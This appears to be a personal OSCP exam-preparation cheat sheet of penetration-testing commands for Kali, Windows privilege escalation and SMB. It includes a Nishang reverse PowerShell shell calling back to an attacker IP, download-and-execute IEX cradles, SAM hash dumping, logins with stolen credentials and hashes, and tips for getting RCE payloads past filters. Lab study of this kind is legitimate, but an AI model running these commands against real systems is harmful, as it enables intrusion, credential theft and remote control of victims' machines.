# oscp-cheatsheet

## Kali General

- Listen for pings to test if you remote command worked
  - `tcpdump -i interface icmp`
- Download all files from an ftp service
  - `wget -m --no-passive ftp://anonymous:anonymous@ipaddress`
- Read zip file info
  - `7z l -slt File.zip`
- Useful tools
  - xclip

## General Resources

- Ippsec has timestamp links in the description of all of his videos outlining the current command or technique he is performing
  - Google dork examples: `ippsec hackthebox mimikatz site:youtube.com`, `ippsec hackthebox download with powershell site:youtube.com`

## Windows

### Resources

- [Path Traversal](https://www.gracefulsecurity.com/path-traversal-cheat-sheet-windows/)

### Privesc

- Test if powershell is working without breaking shell
  - `powershell whoami`
- Pivot DoS to powershell using Nishang reverse powershell script.
  - Listen w/ nc on a new port.
  - Make a copy of `Invoke-PowerShellTcp.ps1` and add `Invoke-PowerShellTcp -Reverse -IPAddress ATTACKERIP -Port NEWLISTENERPORT` at the bottom of the copy file to run the command automatically
  - Start an HTTP server in the root directoy of the modified nishang script copy
  - Run this from DoS: `powershell "IEX(New-Object Net.WebClient).downloadString("http://0.0.0.0/nishang.ps1")"`
  - Go to your listener terminal, you should now have a reverse PS shell
- Download string that loads a ps script into memory (if you want it to auto run make sure there is a call to the function to do so at the bottom of the script, or else it'll just load the functions into memory)
  - `IEX(New-Object Net.WebClient).downloadString("http://0.0.0.0/jaws.ps1")`
- Download file
  - PS `IEX(New-Object Net.Webclient).downloadFile("<urltofile>","savelocation")`
- Run cmd as other user
  - PS > `$SecPass = ConvertTo-SecureString "password" -AsPlainText -Force; $cred = New-Object system.management.Automation.PSCredential('username', $SecPass); Start-Process -FilePath "powershell" -argumentlist "CMD" -Credential $cred`
  - DOS > `\Windows\System32\runas.exe`
- Run exe
  - PS from working directory `Start-Process -FilePath "sort.exe"`
  - PS from other directory `Start-Process -FilePath "myfile.txt" -WorkingDirectory "C:\PS-Test"`
  - PS as admin `Start-Process -FilePath "powershell" -Verb RunAs -Credential $cred` (See above on how to create credential)
  - PS with arguments `Start-Process -FilePath "$env:comspec" -ArgumentList "/c dir ``"%systemdrive%\program files\``""`
- Decrypy SAM password hashes
  - `impacket-secretsdump -sam SAMFILE -system SYSTEMFILE local`
- Determine admin accounts
  - DOS: `net localgroup administrators`
- SAM and SYSTEM file location
  - `Windows/System32/config`
- Log into remote windows host with stolen creds (SMB required)
  - `psexec.py user@ip`
- Find shortcut location (`*.lnk`)
  - PS `$Wscript = New-Object -ComObject Wscript.shell; $shortcut = Get-ChildItem *.lnk'; $Wscript.CreateShortcut($shortcut)`
- Remember to check for dates when patches were applied, it'll key you into good potential kernel exploits
- Check panther directory, install logs get put in here and contain creds
- Read contents of file in PS shell
  - `get-Content "filename"`

### SMB

- Connect with stolen hash
  - `smbmap -u USER -p HASH -H hostnameIP`

### Troublshooting

- Have you checked for vuln apps in program files?
- Have you noticed any running processes that look obviously suspicious?
- Have you check all files in /Users directory (ie. /Desktop, /Documents
- Have you checked for hidden files?
  - `dir /ah`

## Linux

- Resources
  - [Path Traversal](https://www.gracefulsecurity.com/path-traversal-cheat-sheet-linux/)

## Troubleshooting

- Did an RCE test work but your payload fail?
  - Try changing single quotes to double quotes or in some cases, like a powershell command, try double to triple and vice versa
  - Try escaping special characters
  - Try changing your outgoing port to a more commonly used one (80, 443, 21, 22, etc)
  - Try removing bad characters
    - ex: `cat reverse.ps1 OR echo -n "cmd" | iconv -t UTF-16LE | base64 -w0 | xclip -selection clipboard`
      - `powsershell-enc base64scriptpaste`
  - If you used msfvenom make sure your archicitecture is correct
  - If you used msfvenom make sure your payload size isn't too large
  - If you used msfvenom try pivoting options
- Is your file transfer failing
  - do you have write access to the CWD?
  